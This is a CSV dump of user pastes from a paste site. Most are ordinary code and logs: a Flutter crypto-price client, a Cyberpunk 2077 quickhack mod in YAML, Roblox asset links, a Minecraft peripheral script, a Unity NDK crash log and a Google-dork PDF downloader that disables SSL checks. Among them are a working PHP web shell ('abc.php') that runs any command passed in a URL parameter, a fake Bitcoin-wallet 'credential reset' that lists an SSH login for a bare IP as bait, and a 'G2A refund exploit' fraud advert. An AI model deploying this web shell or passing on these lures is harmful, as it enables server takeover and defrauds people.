id,title,username,language,date,content
iURnjiS6,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Tuesday 19th of December 2023 11:33:20 PM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-715480"
V1uBSRHe,G2A Refund Exploit Dec 2023,G2ARefundExploit,GetText,Tuesday 19th of December 2023 10:20:37 PM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
13 December 2023

917706"
nfmFV34K,INVENTARIO,LeanCoder0852,C#,Tuesday 19th of December 2023 09:59:38 PM CDT,INVENTARIO2023
qLcDEB0J,flutter api,yocky12k,Dart,Tuesday 19th of December 2023 08:53:46 PM CDT,"dependencies:
  flutter:
    sdk: flutter
  http: ^0.13.6

file api_service.dart

import 'package:http/http.dart' as http;
import 'dart:convert';

class ApiService {
  Future<List<dataCrypto>> bacaApi() async {
    final response = await http.get(Uri.parse('https://api.coinlore.net/api/tickers/'));
    if(response.statusCode == 200){
      final List<dynamic> dataList = json.decode(response.body)['data'];
      List<dataCrypto> cryptoList = dataList.map((data) => dataCrypto.fromJson(data)).toList();
      return cryptoList;
    }else{
      throw Exception('Gagal baca data');
    }
  }
}

class dataCrypto {
  final String id;
  final String symbol;
  final String name;

  dataCrypto({
    required this.id,
    required this.symbol,
    required this.name,
  });

  factory dataCrypto.fromJson(Map<String, dynamic> json){
    return dataCrypto(
      id: json['id'],
      symbol: json['symbol'],
      name: json['name'],
      );
  }
}

file provider_crypto.dart
import 'package:flutter/material.dart';
import 'api_service.dart';

class ProviderCrypto extends ChangeNotifier {
  final ApiService apiService = ApiService();
  List<dataCrypto> cryptoList = [];

  Future<void> ambilApi() async {
    try {
       cryptoList = await apiService.bacaApi();
       notifyListeners();
    } catch (e) {
       print('Error: $e');
    }
  }
}"
NxPpe53y,Mod Fix: Blackwall Quickhacks enabled and Iconic version via PL story,michaelrw,YAML,Tuesday 19th of December 2023 08:39:25 PM CDT,"# mod made by AliceMods662
# updated by exploiteddna 19Dec2023 :) 

Items.BlackwallGateway_Songbird:
  $base: Items.BlackWallProgramLvl4
  entityName: sy_blackwallbreach
  appearanceName: sy_blackwallbreach_
  displayName: BlackwallDisplayName
  quality: Quality.Legendary
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_iconic_blackwallBreach
  tags:
    - itemPart
    - SoftwareShard
    - Tier2Shard
    - Tier3Shard
    - Tier4Shard
  objectActions:
    - ItemAction.ProgramDisassemble
    - QuickHack.BlackWallHackIconic
    - QuickHack.BlackWallHackIconic
    - QuickHack.BlackWallHackIconic

  statModifiers:
    - Quality.IconicItem
  CraftingData: Items.BlackwallBreachCraftingPackage
  OnAttach: [ EquipmentGLP.BlackwallBreachProgramLvl4 ]

Items.BlackwallBreachCraftingPackage:
  $type: gamedataCraftingPackage_Record
  craftingExpModifier: 1
  craftingRecipe:
    - Items.LegendaryProgramCraftingPackage_blackwall
    - Items.LegendaryProgramCraftingPackage_blackwall_inline0
  overcraftPenaltyModifier: 1

Items.LegendaryProgramCraftingPackage_blackwall:
  $type: gamedataRecipeElement_Record
  amount: 75
  ingredient: Items.QuickHackLegendaryMaterial1

Items.LegendaryProgramCraftingPackage_blackwall_inline0:
  $type: gamedataRecipeElement_Record
  amount: 1
  ingredient: Items.Q305_Cerberus_core_cracked

# ------------------------- mechanics --------------------------


QuickHack.BlackWallHackIconic:
    $type: gamedataObjectAction_Record
    actionName: BlackWall
    hackCategory: HackCategory.UltimateHack
    interactionLayer: remote
    objectActionType: ObjectActionType.PuppetQuickHack
    objectActionUI: Interactions.BlackwallHack
    priority: 3
    activationTime:
      - QuickHack.BaseBlackWallHackIconic_inline11
    completionEffects:
      - QuickHack.QuickHack_inline2
      - QuickHack.QuickHack_inline6
      - QuickHack.QuickHack_inline8
      - QuickHack.QuickHack_inline9
      - QuickHack.UltimateHack_inline5
      - QuickHack.BaseBlackWallHack_inline9
      - QuickHack.BlackWallHackIconic_inline3
      - QuickHack.BlackWallHack_inline6
      - QuickHack.BlackWallHack_inline12
    costs:
      - QuickHack.BaseBlackWallHackIconic_inline7
    durationTime: []
    instigatorActivePrereqs: []
    instigatorPrereqs:
      - QuickHack.QuickHack_inline1
      - QuickHack.BaseBlackWallHack_inline0
    rewards: []
    startEffects:
      - QuickHack.QuickHack_inline10
      - QuickHack.UltimateHack_inline1
      - QuickHack.BaseBlackWallHack_inline1
      - QuickHack.BaseBlackWallHack_inline2
      - QuickHack.BaseBlackWallHackIconic_inline3
      - QuickHack.BaseBlackWallHackIconic_inline4
      - QuickHack.BaseBlackWallHack_inline5
      - QuickHack.BlackWallHackIconic_inline0
    targetActivePrereqs:
      - Prereqs.QuickHackUploadingPrereq
      - Prereqs.ChimeraNoQuickHackPrereq
      - Prereqs.QuickHackTargetMortalPrereq
      - Prereqs.BlackwallPrereq
    targetPrereqs: []
    awarenessCost: QuickHack.UltimateHack_inline2
    memoryCostReductionInOverclock: 0.725000024
    isQuickHack: True

QuickHack.BaseBlackWallHackIconic_inline7: #costs
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BaseBlackWallHackIconic_inline8


QuickHack.BaseBlackWallHackIconic_inline8:
  $type: gamedataConstantStatModifier_Record
  value: 12
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BaseBlackWallHackIconic_inline11:
  $type: gamedataConstantStatModifier_Record
  value: 8
  modifierType: Additive
  statType: BaseStats.QuickHackUpload

QuickHack.BlackWallHackIconic_inline3:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackWallHackIconic_inline4
  recipient: ObjectActionReference.Target

QuickHack.BaseBlackWallHackIconic_inline11_inline4:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce2
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackWallHack_inline5
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

QuickHack.BlackwallHackIconic_inline0:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackWallHackIconic_inline1
  recipient: ObjectActionReference.Target

QuickHack.BlackWallHackIconic_inline1:
    $type: gamedataSpreadEffector_Record
    effectTag: spread
    objectAction: QuickHack.BlackwallHackIconicBounce2
    spreadToAllTargetsInTheArea: False
    effectorClassName: SpreadEffector
    prereqRecord: QuickHack.BlackWallHack_inline2
    removeAfterActionCall: False
    removeAfterPrereqCheck: False
    statModifierGroups: []

QuickHack.BlackWallHackIconic_inline4:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce2
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackWallHack_inline5
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []


#----------------------------------------------------------- BOUNCE 2---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce2:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackIconicBounce2_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce2_inline8
    - QuickHack.BlackwallHackBounce2_inline11
    - QuickHack.BlackwallHackBounce2_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce2_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce2_inline3
    - QuickHack.BlackwallHackBounce2_inline4
    - QuickHack.BlackwallHackBounce2_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce2_inline1:
  $base: QuickHack.BlackwallHackBounce2_inline1
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce2_inline2

QuickHack.BlackwallHackIconicBounce2_inline2:
  $base: QuickHack.BlackwallHackBounce2_inline2
  value: 16

QuickHack.BlackwallHackIconicBounce2_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce2_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce2_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce3
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce2_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []
#----------------------------------------------------------- BOUNCE 3---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce3:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce3_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce3_inline8
    - QuickHack.BlackwallHackBounce3_inline11
    - QuickHack.BlackwallHackBounce3_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce3_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce3_inline3
    - QuickHack.BlackwallHackBounce3_inline4
    - QuickHack.BlackwallHackBounce3_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce3_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce3_inline2

QuickHack.BlackwallHackIconicBounce3_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 19
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce3_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce3_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce3_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce4
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce3_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

#----------------------------------------------------------- BOUNCE 4---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce4:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce4_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce4_inline8
    - QuickHack.BlackwallHackBounce4_inline11
    - QuickHack.BlackwallHackBounce4_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce4_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce4_inline3
    - QuickHack.BlackwallHackBounce4_inline4
    - QuickHack.BlackwallHackBounce4_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce4_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce4_inline2

QuickHack.BlackwallHackIconicBounce4_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 23
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce4_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce4_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce4_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce5
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce4_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

#----------------------------------------------------------- BOUNCE 5---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce5:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce5_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackIconicBounce5_inline8
    - QuickHack.BlackwallHackBounce5_inline11
    - QuickHack.BlackwallHackBounce5_inline17
  costs:
    - QuickHack.BlackwallHackIconicBounce5_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce5_inline3
    - QuickHack.BlackwallHackBounce5_inline4
    - QuickHack.BlackwallHackBounce5_inline7
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackIconicBounce5_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackIconicBounce5_inline2

QuickHack.BlackwallHackIconicBounce5_inline2:
  $type: gamedataConstantStatModifier_Record
  value: 25
  modifierType: Additive
  statType: BaseStats.Memory

QuickHack.BlackwallHackIconicBounce5_inline8:
  $type: gamedataObjectActionEffect_Record
  effectorToTrigger: QuickHack.BlackwallHackIconicBounce5_inline9
  recipient: ObjectActionReference.Target

QuickHack.BlackwallHackIconicBounce5_inline9:
  $type: gamedataSpreadEffector_Record
  effectTag: spread
  objectAction: QuickHack.BlackwallHackIconicBounce6
  spreadToAllTargetsInTheArea: False
  effectorClassName: SpreadEffector
  prereqRecord: QuickHack.BlackwallHackBounce5_inline10
  removeAfterActionCall: False
  removeAfterPrereqCheck: False
  statModifierGroups: []

  #----------------------------------------------------------- BOUNCE 6---------------------------------------------------------------------------------

QuickHack.BlackwallHackIconicBounce6:
  $type: gamedataObjectAction_Record
  actionName: BlackWall
  hackCategory: HackCategory.UltimateHack
  interactionLayer: remote
  objectActionType: ObjectActionType.PuppetQuickHack
  objectActionUI: Interactions.BlackwallHack
  priority: 0
  activationTime:
    - QuickHack.BaseBlackWallHack_inline11
    - QuickHack.BlackwallHackBounce6_inline0
  completionEffects:
    - QuickHack.QuickHack_inline2
    - QuickHack.QuickHack_inline6
    - QuickHack.QuickHack_inline8
    - QuickHack.QuickHack_inline9
    - QuickHack.UltimateHack_inline5
    - QuickHack.BaseBlackWallHack_inline9
    - QuickHack.BlackwallHackBounce6_inline5
    - QuickHack.BlackwallHackBounce6_inline11
  costs:
    - QuickHack.BlackwallHackBounce6_inline1
  durationTime: []
  instigatorActivePrereqs: []
  instigatorPrereqs: []
  rewards: []
  startEffects:
    - QuickHack.BlackwallHackBounce6_inline3
    - QuickHack.BlackwallHackBounce6_inline4
  targetActivePrereqs:
    - Prereqs.QuickHackUploadingPrereq
    - Prereqs.ChimeraNoQuickHackPrereq
    - Prereqs.QuickHackTargetMortalPrereq
    - Prereqs.BlackwallPrereq
  targetPrereqs: []
  awarenessCost: QuickHack.UltimateHack_inline2
  memoryCostReductionInOverclock: 0.725000024
  isQuickHack: True

QuickHack.BlackwallHackBounce6_inline1:
  $type: gamedataStatPoolCost_Record
  statPool: BaseStatPools.Memory
  costMods:
    - QuickHack.MemoryCostReductionMod
    - QuickHack.ConsumableCostReduction
    - QuickHack.TargetResistance
    - QuickHack.TargetResistanceExtraUltimate
    - QuickHack.UltimateMemoryCostReductionMod
    - QuickHack.BlackwallHackBounce6_inline2

QuickHack.BlackwallHackBounce6_inline2:
    $type: gamedataConstantStatModifier_Record
    value: 26
    modifierType: Additive
    statType: BaseStats.Memory

#--------------------------- ENABLE -----------------------------------------------------------------
Items.BlackWallProgramLvl4:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach

Items.BlackWallProgramLvl3:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach


Items.BlackWallProgramLvl2:
  tags:
   - !remove HideInUI
   - !remove DummyPart
  icon:
    atlasResourcePath: base\gameplay\gui\common\icons\items\syrial_blackwallProgramInkAtlas\item_icons15.inkatlas
    atlasPartName: sy_quickhack_blackwallBreach

LootTables.ep1_q306_songbirds_cache.maxItemsToLoot: 4
LootTables.ep1_q306_songbirds_cache.minItemsToLoot: 4

#------------------------------------------------------- WEIRD SHIT --------------------------------------
#Vendors.wat_kab_netrunner_01.itemStock:
#  - !append Vendors.wat_kab_netrunner_blackwallGatewaySy

Vendors.wat_kab_netrunner_blackwallGatewaySy:
  $type: gamedataVendorItem_Record
  item: Items.BlackwallGateway_Songbird
  generationPrereqs: [ Prereqs.BlackwallBreachAtYoko ]
  quantity: [ Vendors.IsPresent ]

Vendors.BlackwallPresent:
  $type: gamedataRandomStatModifier_Record
  max: 1
  min: 1
  useControlledRandom: False
  modifierType: Additive
  statType: BaseStats.Quantity

Prereqs.BlackwallBreachAtYoko:
  $type: IPrereq
  prereqClassName: FactValuePrereq

Prereqs.BlackwallBreachAtYoko.comparisonType: n""LessOrEqual""
Prereqs.BlackwallBreachAtYoko.fact: n""q305_ib_datafort_shutdown_finished""
Prereqs.BlackwallBreachAtYoko.value: 0

LootTables.ep1_q306_songbirds_cache.lootItems:
  - LootTables.ep1_q306_songbirds_cache_inline0
  - LootTables.ep1_q306_songbirds_cache_inline1
  - LootTables.ep1_q306_songbirds_cache_inline2
  - LootTables.ep1_q306_songbirds_cache_inline3

LootTables.ep1_q306_songbirds_cache_inline3:
  $type: gamedataLootItem_Record
  itemID: Items.BlackwallGateway_Songbird
  dropChance: 1
  dropCountMax: 1
  dropCountMin: 1
  quantityModifiers: []
  statModifiers: []

LootTables.ep1_q305_haunted_deck_recipe.lootItems:
  - !append LootTables.ep1_q305_haunted_deck_recipe_Blackwall
  - !append LootTables.ep1_q305_haunted_deck_inline4

LootTables.ep1_q305_haunted_deck_recipe_Blackwall:
  $type: gamedataLootItem_Record
  itemID: Items.BlackwallGateway_Songbird
  dropChance: 1
  dropCountMax: 1
  dropCountMin: 1
  quantityModifiers: []
  statModifiers: []

LootTables.ep1_q305_haunted_deck_recipe.maxItemsToLoot: 5
LootTables.ep1_q305_haunted_deck_recipe.minItemsToLoot: 2

EquipmentGLP.BlackwallBreachProgramLvl4:
  $type: gamedataGameplayLogicPackage_Record
  stackable: False
  UIData: EquipmentGLP.BlackwallBreachProgramLvl4_inline0
  animationWrapperOverrides: []
  effectors: []
  items: []
  statPools: []
  stats: []

EquipmentGLP.BlackwallBreachProgramLvl4_inline0:
  $type: gamedataGameplayLogicPackageUIData_Record
  floatValues: [ 5,20 ]
  iconPath: ability_utility
  intValues: []
  localizedDescription: LocKey#blackwall_quickhack_iconic_desc
  localizedName: LocKey#BlackwallAppearanceName
  nameValues: []
  stats: []
"
xHL9xeKF,bodycolorrs,Lancere,Lua,Tuesday 19th of December 2023 08:29:02 PM CDT,null nil 125 125 125 Body Colors 125 125 125 true
iyCMj3JN,Untitled,Lancere,Lua,Tuesday 19th of December 2023 08:27:36 PM CDT,https://pastebin.com/raw/xHL9xeKF?userid=2;http://www.roblox.com/Asset/?id=1272714;http://www.roblox.com/Asset/?id=305888394;http://www.roblox.com/Asset/?id=6340141;http://www.roblox.com/Asset/?id=27112025;http://www.roblox.com/Asset/?id=32336182;http://www.roblox.com/Asset/?id=32336117;http://www.roblox.com/Asset/?id=27112056;http://www.roblox.com/Asset/?id=27112068;http://www.roblox.com/Asset/?id=10831454;http://www.roblox.com/Asset/?id=25926517&type=gear;http://www.roblox.com/Asset/?id=47044627;http://www.roblox.com/Asset/?id=5200062;http://www.roblox.com/Asset/?id=389012259;
aELNPxLG,abc.php,Nizar-Dev,PHP,Tuesday 19th of December 2023 07:59:21 PM CDT,"<?php
// shell.php
if(isset($_GET['cmd'])) {
    $output = shell_exec( $_GET['cmd'] );
    $html = isset($_GET['html']) ? true : false;
    if($html === true) {
        echo ""<pre>\n"";
    }
    echo $output;
    if($html === true) {
        echo ""</pre>\n"";
    }
    exit;
}
?>"
UijkVi6v,dork downloader (PDFs),nitestryker,Python,Tuesday 19th of December 2023 07:55:33 PM CDT,"#!/bin/python
# Copyright 2023 Nitestryker

# This software is provided 'as-is', without any express or implied
# warranty.  In no event will the authors be held liable for any damages
#  arising from the use of this software.

#  Permission is granted to anyone to use this software for any purpose,
#  including commercial applications, and to alter it and redistribute it
#  freely, subject to the following restrictions:

#  1. The origin of this software must not be misrepresented; you must not
#     claim that you wrote the original software. If you use this software
#     in a product, an acknowledgment in the product documentation would be
#    appreciated but is not required.
#  2. Altered source versions must be plainly marked as such, and must not be
#     misrepresented as being the original software.
#  3. This notice may not be removed or altered from any source distribution.

import requests
import os

def download_pdf(url, output_path):
    #response = requests.get(url, stream=True)
    response = requests.get(url, stream=True, verify=False) # Disable SSL certificate verification
    if response.status_code == 200:
        with open(output_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=1024):
                if chunk:
                    file.write(chunk)
        print(f""Downloaded: {output_path}"")
    else:
        print(f""Failed to download: {url} (Status Code: {response.status_code})"")

def search_and_download(query, num_results, base_url, output_dir):
    # Perform the Google search using the query
    search_url = f""{base_url}/search?q={query}""
    response = requests.get(search_url)
    search_results = response.text

    # Create the output directory if it doesn't exist
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Keep track of the number of downloaded PDFs
    downloaded_count = 0

    # Extract and download PDF links
    start_index = 0
    while downloaded_count < num_results:
        start_link = search_results.find('<a href=""/url?q=', start_index)
        end_link = search_results.find('&amp;', start_link + 1)
        if start_link == -1 or end_link == -1:
            break

        url = search_results[start_link + 16: end_link]
        if url.endswith('.pdf'):
            filename = url.split(""/"")[-1]
            output_path = os.path.join(output_dir, filename)
            download_pdf(url, output_path)
            downloaded_count += 1

        start_index = end_link

# Set the query, number of results to retrieve, base URL, and output directory
query = 'filetype:pdf programming'
num_results = 10
base_url = ""https://www.google.com""
output_dir = ""pdfs""

# Call the search_and_download function
search_and_download(query, num_results, base_url, output_dir)
"
BfhiCXW2,CC Advanced Peripheral Minecolonies ME Supplier,ecco7777,Lua,Tuesday 19th of December 2023 07:44:49 PM CDT,"me=peripheral.wrap(""top"")
mc=peripheral.wrap(""back"")
stuff=mc.getWorkOrderResources(1)
for i=1,#stuff do
    item={}
    item.name=stuff[i].item
    item.count=stuff[i].needed-stuff[i].available
    if stuff.status~=""NOT_NEEDED"" then
        me.exportItem(item,""up"")
    end
end"
XuchtCx4,Unity android build error report 20.12.23,fahimkamal63,C++,Tuesday 19th of December 2023 07:12:22 PM CDT,"Building Library\Bee\artifacts\Android\iz17e\j7y14mr6e1nw.o failed with output:
PLEASE submit a bug report to https://github.com/android-ndk/ndk/issues and include the crash backtrace, preprocessed source, and associated run script.
Stack dump:
0.	Program arguments: ""C:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/PlaybackEngines/AndroidPlayer/NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/clang++"" -march=armv7-a -mfloat-abi=softfp -mfpu=neon-fp16 -marm -D__ARM_ARCH_7__ -D__ARM_ARCH_7A__ -D__ANDROID_UNAVAILABLE_SYMBOLS_ARE_WEAK__ -faddrsig -mllvm -hoist-common-insts=1 -DANDROID -DHAVE_INTTYPES_H -no-canonical-prefixes -funwind-tables -fstack-protector -fomit-frame-pointer -std=c++11 -Wswitch -Wno-trigraphs -Wno-tautological-compare -Wno-invalid-offsetof -Wno-implicitly-unsigned-literal -Wno-integer-overflow -Wno-shift-negative-value -Wno-unknown-attributes -Wno-implicit-function-declaration -Wno-null-conversion -Wno-missing-declarations -Wno-unused-value -Wno-pragma-once-outside-header -fvisibility=hidden -fexceptions -fno-rtti -g -Os -fPIC -fno-strict-overflow -ffunction-sections -fdata-sections -fmessage-length=0 -pipe -D_GLIBCXX_USE_CXX11_ABI=0 -DBASELIB_INLINE_NAMESPACE=il2cpp_baselib -DIL2CPP_MONO_DEBUGGER_DISABLED -DRUNTIME_IL2CPP -DHAVE_BDWGC_GC -DNDEBUG -I. ""-ID:/Unity Projects/Unity_Boat_Blitz_v2/Boat Blitz Clone/Library/Bee/artifacts/Android/il2cppOutput/cpp"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/libil2cpp/pch"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/libil2cpp"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/external/baselib/Include"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/libil2cpp/os/ClassLibraryPAL/brotli/include"" ""-IC:/Program Files/Unity/Hub/Editor/2022.3.5f1/Editor/Data/il2cpp/external/baselib/Platforms/Android/Include"" -o Library/Bee/artifacts/Android/iz17e/j7y14mr6e1nw.o -fcolor-diagnostics -fdiagnostics-absolute-paths -target armv7a-linux-androideabi22 -fstrict-aliasing -fdiagnostics-format=msvc -c -x c++ ""D:/Unity Projects/Unity_Boat_Blitz_v2/Boat Blitz Clone/Library/Bee/artifacts/Android/il2cppOutput/cpp/Newtonsoft.Json__2.cpp""
1.	<eof> parser at end of file
2.	Code generation
3.	Running pass 'Function Pass Manager' on module 'D:/Unity Projects/Unity_Boat_Blitz_v2/Boat Blitz Clone/Library/Bee/artifacts/Android/il2cppOutput/cpp/Newtonsoft.Json__2.cpp'.
